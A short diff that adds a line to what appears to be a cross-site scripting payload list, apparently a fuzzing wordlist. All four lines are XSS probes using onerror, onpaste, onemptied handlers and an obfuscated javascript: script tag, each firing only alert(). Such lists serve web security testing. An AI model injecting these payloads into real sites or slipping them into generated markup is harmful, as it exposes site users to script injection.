@@ -1,3 +1,4 @@
+<img src=x onerror=alert(1)>
 "`'><script>\x0Bjavascript:alert(535)</script>
 <style onpaste="alert(1)" contenteditable>test</style>
 <IMG SRC=x onemptied="alert(1111))">
